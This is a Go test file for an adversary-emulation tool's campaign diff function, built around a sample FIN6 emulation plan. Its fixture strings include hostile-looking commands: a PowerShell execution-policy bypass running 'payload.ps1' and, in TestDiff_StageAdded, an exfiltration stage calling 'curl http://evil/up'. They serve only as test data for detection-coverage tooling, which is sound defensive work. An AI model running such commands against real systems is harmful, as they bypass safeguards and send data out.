// Copyright (c) 2024-2026 ThreatEcho. All rights reserved.
// SPDX-License-Identifier: AGPL-3.0-only
// https://threatecho.com

package campaign

import (
	"strings"
	"testing"
	"time"
)

// baseCampaign returns a minimal campaign for diff testing. Callers mutate
// the returned value to set up the "right" side of a diff.
func diffBaseCampaign() *Campaign {
	return &Campaign{
		APIVersion: "v1",
		Kind:       "campaign",
		Meta: Meta{
			Name:         "FIN6 Emulation",
			Adversary:    "FIN6",
			Description:  "FIN6 adversary emulation plan",
			Objective:    "Validate detection coverage",
			MitreVersion: "14.1",
			Severity:     "high",
			Tags:         []string{"fin6", "apt"},
			Authors:      []string{"alice"},
			References:   []string{"https://attack.mitre.org"},
			Created:      "2026-01-01",
			Modified:     "2026-01-01",
		},
		Variables: map[string]string{
			"target_host": "10.0.0.1",
			"payload_dir": "/tmp/payloads",
		},
		Stages: []Stage{
			{
				ID:        "recon-1",
				Name:      "Network scan",
				Technique: "T1046",
				Tactic:    "discovery",
				Platform:  []string{"linux", "windows"},
				Execute: Execute{
					Type:     "shell",
					Commands: []string{"nmap -sV {{target_host}}"},
				},
				Expect: Expect{
					Telemetry:  []string{"process_create", "network_connect"},
					Detections: []string{"sigma:net_scan"},
				},
			},
			{
				ID:        "exec-1",
				Name:      "Run payload",
				Technique: "T1059.001",
				Tactic:    "execution",
				DependsOn: []string{"recon-1"},
				Execute: Execute{
					Type:     "shell",
					Commands: []string{"powershell -ep bypass -f payload.ps1"},
					Cleanup:  []string{"rm payload.ps1"},
					Elevated: true,
					Args: map[string]string{
						"encoding": "base64",
					},
				},
				Expect: Expect{
					Telemetry:  []string{"process_create"},
					Detections: []string{"sigma:powershell_exec"},
					Artifacts:  []string{"payload.ps1"},
					IOCs:       []string{"evil.exe"},
				},
				Timeout: Duration{30 * time.Second},
			},
		},
	}
}

// clone does a simple deep-enough copy for test purposes.
func clone(c *Campaign) *Campaign {
	cp := *c
	cp.Meta = c.Meta

	// Copy tags/authors/references slices.
	cp.Meta.Tags = append([]string(nil), c.Meta.Tags...)
	cp.Meta.Authors = append([]string(nil), c.Meta.Authors...)
	cp.Meta.References = append([]string(nil), c.Meta.References...)

	// Copy variables map.
	cp.Variables = make(map[string]string, len(c.Variables))
	for k, v := range c.Variables {
		cp.Variables[k] = v
	}

	// Deep copy stages.
	cp.Stages = make([]Stage, len(c.Stages))
	for i, s := range c.Stages {
		ns := s
		ns.Platform = append([]string(nil), s.Platform...)
		ns.DependsOn = append([]string(nil), s.DependsOn...)
		ns.Execute.Commands = append([]string(nil), s.Execute.Commands...)
		ns.Execute.Cleanup = append([]string(nil), s.Execute.Cleanup...)
		if s.Execute.Args != nil {
			ns.Execute.Args = make(map[string]string, len(s.Execute.Args))
			for k, v := range s.Execute.Args {
				ns.Execute.Args[k] = v
			}
		}
		ns.Expect.Telemetry = append([]string(nil), s.Expect.Telemetry...)
		ns.Expect.Detections = append([]string(nil), s.Expect.Detections...)
		ns.Expect.Artifacts = append([]string(nil), s.Expect.Artifacts...)
		ns.Expect.IOCs = append([]string(nil), s.Expect.IOCs...)
		cp.Stages[i] = ns
	}
	return &cp
}

func TestDiff_Identical(t *testing.T) {
	a := diffBaseCampaign()
	b := clone(a)
	report := Diff(a, b)
	if report.HasChanges() {
		t.Fatal("expected no changes for identical campaigns")
	}
}

func TestDiff_MetaNameChange(t *testing.T) {
	a := diffBaseCampaign()
	b := clone(a)
	b.Meta.Name = "FIN7 Emulation"
	report := Diff(a, b)
	if !report.HasChanges() {
		t.Fatal("expected changes")
	}
	found := false
	for _, mc := range report.MetaChanges {
		if mc.Field == "name" && mc.Left == "FIN6 Emulation" && mc.Right == "FIN7 Emulation" {
			found = true
		}
	}
	if !found {
		t.Fatal("expected meta name change")
	}
}

func TestDiff_MetaSeverityChange(t *testing.T) {
	a := diffBaseCampaign()
	b := clone(a)
	b.Meta.Severity = "critical"
	report := Diff(a, b)
	found := false
	for _, mc := range report.MetaChanges {
		if mc.Field == "severity" && mc.Left == "high" && mc.Right == "critical" {
			found = true
		}
	}
	if !found {
		t.Fatal("expected severity change")
	}
}

func TestDiff_MetaTagsAdded(t *testing.T) {
	a := diffBaseCampaign()
	b := clone(a)
	b.Meta.Tags = append(b.Meta.Tags, "ransomware")
	report := Diff(a, b)
	found := false
	for _, mc := range report.MetaChanges {
		if mc.Field == "tags" && strings.Contains(mc.Right, "+ransomware") {
			found = true
		}
	}
	if !found {
		t.Fatalf("expected tags addition, got meta changes: %+v", report.MetaChanges)
	}
}

func TestDiff_MetaTagsRemoved(t *testing.T) {
	a := diffBaseCampaign()
	b := clone(a)
	b.Meta.Tags = []string{"fin6"} // removed "apt"
	report := Diff(a, b)
	found := false
	for _, mc := range report.MetaChanges {
		if mc.Field == "tags" && strings.Contains(mc.Left, "-apt") {
			found = true
		}
	}
	if !found {
		t.Fatalf("expected tags removal, got meta changes: %+v", report.MetaChanges)
	}
}

func TestDiff_VariableAdded(t *testing.T) {
	a := diffBaseCampaign()
	b := clone(a)
	b.Variables["new_var"] = "new_value"
	report := Diff(a, b)
	if v, ok := report.VariablesAdded["new_var"]; !ok || v != "new_value" {
		t.Fatal("expected new_var in VariablesAdded")
	}
}

func TestDiff_VariableRemoved(t *testing.T) {
	a := diffBaseCampaign()
	b := clone(a)
	delete(b.Variables, "payload_dir")
	report := Diff(a, b)
	if v, ok := report.VariablesRemoved["payload_dir"]; !ok || v != "/tmp/payloads" {
		t.Fatal("expected payload_dir in VariablesRemoved")
	}
}

func TestDiff_VariableModified(t *testing.T) {
	a := diffBaseCampaign()
	b := clone(a)
	b.Variables["target_host"] = "192.168.1.1"
	report := Diff(a, b)
	pair, ok := report.VariablesModified["target_host"]
	if !ok {
		t.Fatal("expected target_host in VariablesModified")
	}
	if pair[0] != "10.0.0.1" || pair[1] != "192.168.1.1" {
		t.Fatalf("unexpected modification pair: %v", pair)
	}
}

func TestDiff_StageAdded(t *testing.T) {
	a := diffBaseCampaign()
	b := clone(a)
	b.Stages = append(b.Stages, Stage{
		ID:        "exfil-1",
		Name:      "Exfiltrate data",
		Technique: "T1041",
		Tactic:    "exfiltration",
		Execute:   Execute{Type: "shell", Commands: []string{"curl http://evil/up"}},
	})
	report := Diff(a, b)
	if len(report.StagesAdded) != 1 {
		t.Fatalf("expected 1 stage added, got %d", len(report.StagesAdded))
	}
	if report.StagesAdded[0].ID != "exfil-1" {
		t.Fatal("expected exfil-1 in added stages")
	}
}

func TestDiff_StageRemoved(t *testing.T) {
	a := diffBaseCampaign()
	b := clone(a)
	b.Stages = b.Stages[:1] // remove exec-1
	report := Diff(a, b)
	if len(report.StagesRemoved) != 1 {
		t.Fatalf("expected 1 stage removed, got %d", len(report.StagesRemoved))
	}
	if report.StagesRemoved[0].ID != "exec-1" {
		t.Fatal("expected exec-1 in removed stages")
	}
}

func TestDiff_StageTechniqueChanged(t *testing.T) {
	a := diffBaseCampaign()
	b := clone(a)
	b.Stages[0].Technique = "T1049"
	report := Diff(a, b)
	if len(report.StagesModified) != 1 {
		t.Fatalf("expected 1 stage modified, got %d", len(report.StagesModified))
	}
	sd := report.StagesModified[0]
	if sd.StageID != "recon-1" {
		t.Fatal("expected modification on recon-1")
	}
	found := false
	for _, c := range sd.Changes {
		if c.Field == "technique" && c.Left == "T1046" && c.Right == "T1049" {
			found = true
		}
	}
	if !found {
		t.Fatal("expected technique change in stage diff")
	}
}

func TestDiff_StageTelemetryChanged(t *testing.T) {
	a := diffBaseCampaign()
	b := clone(a)
	// Remove network_connect, add file_create.
	b.Stages[0].Expect.Telemetry = []string{"process_create", "file_create"}
	report := Diff(a, b)
	if len(report.StagesModified) == 0 {
		t.Fatal("expected stage modification")
	}
	sd := report.StagesModified[0]
	found := false
	for _, c := range sd.Changes {
		if c.Field == "telemetry" {
			if !strings.Contains(c.Left, "-network_connect") {
				t.Fatalf("expected -network_connect in Left, got %q", c.Left)
			}
			if !strings.Contains(c.Right, "+file_create") {
				t.Fatalf("expected +file_create in Right, got %q", c.Right)
			}
			found = true
		}
	}
	if !found {
		t.Fatal("expected telemetry change")
	}
}

func TestDiff_StageDetectionsChanged(t *testing.T) {
	a := diffBaseCampaign()
	b := clone(a)
	b.Stages[0].Expect.Detections = []string{"sigma:net_scan", "sigma:port_scan"}
	report := Diff(a, b)
	if len(report.StagesModified) == 0 {
		t.Fatal("expected stage modification")
	}
	found := false
	for _, c := range report.StagesModified[0].Changes {
		if c.Field == "detections" && strings.Contains(c.Right, "+sigma:port_scan") {
			found = true
		}
	}
	if !found {
		t.Fatal("expected detections addition")
	}
}

func TestDiff_StageDependsOnChanged(t *testing.T) {
	a := diffBaseCampaign()
	b := clone(a)
	b.Stages[1].DependsOn = []string{"recon-1", "recon-2"}
	report := Diff(a, b)
	found := false
	for _, sd := range report.StagesModified {
		if sd.StageID == "exec-1" {
			for _, c := range sd.Changes {
				if c.Field == "depends_on" && strings.Contains(c.Right, "+recon-2") {
					found = true
				}
			}
		}
	}
	if !found {
		t.Fatal("expected depends_on addition")
	}
}

func TestDiff_StageExecuteCommandsChanged(t *testing.T) {
	a := diffBaseCampaign()
	b := clone(a)
	b.Stages[0].Execute.Commands = []string{"nmap -sV {{target_host}}", "nmap -O {{target_host}}"}
	report := Diff(a, b)
	found := false
	for _, sd := range report.StagesModified {
		if sd.StageID == "recon-1" {
			for _, c := range sd.Changes {
				if c.Field == "execute.commands" && strings.Contains(c.Right, "+nmap -O {{target_host}}") {
					found = true
				}
			}
		}
	}
	if !found {
		t.Fatal("expected execute.commands addition")
	}
}

func TestDiff_MultipleChanges(t *testing.T) {
	a := diffBaseCampaign()
	b := clone(a)

	// Meta change.
	b.Meta.Severity = "critical"

	// Variable change.
	b.Variables["new_key"] = "value"

	// Stage added.
	b.Stages = append(b.Stages, Stage{
		ID:        "lateral-1",
		Name:      "Lateral movement",
		Technique: "T1021",
		Tactic:    "lateral-movement",
		Execute:   Execute{Type: "shell"},
	})

	// Stage modified.
	b.Stages[0].Technique = "T1049"

	report := Diff(a, b)
	if !report.HasChanges() {
		t.Fatal("expected changes")
	}
	if len(report.MetaChanges) != 1 {
		t.Fatalf("expected 1 meta change, got %d", len(report.MetaChanges))
	}
	if len(report.VariablesAdded) != 1 {
		t.Fatalf("expected 1 variable added, got %d", len(report.VariablesAdded))
	}
	if len(report.StagesAdded) != 1 {
		t.Fatalf("expected 1 stage added, got %d", len(report.StagesAdded))
	}
	if len(report.StagesModified) != 1 {
		t.Fatalf("expected 1 stage modified, got %d", len(report.StagesModified))
	}
}

func TestDiff_HasChanges(t *testing.T) {
	a := diffBaseCampaign()

	t.Run("no changes", func(t *testing.T) {
		b := clone(a)
		report := Diff(a, b)
		if report.HasChanges() {
			t.Fatal("should not have changes")
		}
	})

	t.Run("meta change", func(t *testing.T) {
		b := clone(a)
		b.Meta.Name = "changed"
		report := Diff(a, b)
		if !report.HasChanges() {
			t.Fatal("should have changes")
		}
	})

	t.Run("variable change", func(t *testing.T) {
		b := clone(a)
		b.Variables["x"] = "y"
		report := Diff(a, b)
		if !report.HasChanges() {
			t.Fatal("should have changes")
		}
	})

	t.Run("stage added", func(t *testing.T) {
		b := clone(a)
		b.Stages = append(b.Stages, Stage{ID: "new"})
		report := Diff(a, b)
		if !report.HasChanges() {
			t.Fatal("should have changes")
		}
	})

	t.Run("stage removed", func(t *testing.T) {
		b := clone(a)
		b.Stages = b.Stages[:1]
		report := Diff(a, b)
		if !report.HasChanges() {
			t.Fatal("should have changes")
		}
	})
}

func TestDiff_Summary(t *testing.T) {
	a := diffBaseCampaign()

	t.Run("identical", func(t *testing.T) {
		b := clone(a)
		report := Diff(a, b)
		if report.Summary() != "no changes" {
			t.Fatalf("expected 'no changes', got %q", report.Summary())
		}
	})

	t.Run("mixed changes", func(t *testing.T) {
		b := clone(a)
		b.Meta.Severity = "critical"
		b.Variables["x"] = "y"
		b.Stages[0].Technique = "T1049"
		b.Stages = append(b.Stages, Stage{ID: "new"})

		report := Diff(a, b)
		s := report.Summary()
		if !strings.Contains(s, "meta field(s) changed") {
			t.Fatalf("summary missing meta info: %q", s)
		}
		if !strings.Contains(s, "variable(s) changed") {
			t.Fatalf("summary missing variable info: %q", s)
		}
		if !strings.Contains(s, "stage(s) modified") {
			t.Fatalf("summary missing stage modified info: %q", s)
		}
		if !strings.Contains(s, "stage(s) added") {
			t.Fatalf("summary missing stage added info: %q", s)
		}
	})
}

func TestFormatDiff_NonEmpty(t *testing.T) {
	a := diffBaseCampaign()
	b := clone(a)
	b.Meta.Severity = "critical"
	b.Stages[0].Technique = "T1049"
	b.Stages = append(b.Stages, Stage{
		ID:        "new-1",
		Name:      "New stage",
		Technique: "T1055",
		Tactic:    "defense-evasion",
		Execute:   Execute{Type: "shell"},
	})

	report := Diff(a, b)
	output := FormatDiff(report)

	if len(output) == 0 {
		t.Fatal("expected non-empty format output")
	}

	checks := []string{
		"=== Meta Changes ===",
		"severity",
		"=== Stages Modified ===",
		"recon-1",
		"=== Stages Added ===",
		"new-1",
	}
	for _, check := range checks {
		if !strings.Contains(output, check) {
			t.Fatalf("FormatDiff output missing %q\nGot:\n%s", check, output)
		}
	}
}

func TestFormatDiff_Identical(t *testing.T) {
	a := diffBaseCampaign()
	b := clone(a)
	report := Diff(a, b)
	output := FormatDiff(report)
	if !strings.Contains(output, "identical") {
		t.Fatalf("expected 'identical' in output for no-change diff, got: %s", output)
	}
}

func TestDiff_StageExecuteArgsChanged(t *testing.T) {
	a := diffBaseCampaign()
	b := clone(a)
	b.Stages[1].Execute.Args["encoding"] = "utf8"
	b.Stages[1].Execute.Args["format"] = "json"
	report := Diff(a, b)
	found := false
	for _, sd := range report.StagesModified {
		if sd.StageID == "exec-1" {
			for _, c := range sd.Changes {
				if c.Field == "execute.args" {
					found = true
				}
			}
		}
	}
	if !found {
		t.Fatal("expected execute.args change")
	}
}

func TestDiff_DurationIgnoredWhenBothZero(t *testing.T) {
	a := diffBaseCampaign()
	b := clone(a)
	// recon-1 has zero timeout and zero delay on both sides — no diff expected.
	report := Diff(a, b)
	for _, sd := range report.StagesModified {
		if sd.StageID == "recon-1" {
			for _, c := range sd.Changes {
				if c.Field == "timeout" || c.Field == "delay" {
					t.Fatalf("unexpected duration change: %+v", c)
				}
			}
		}
	}
}
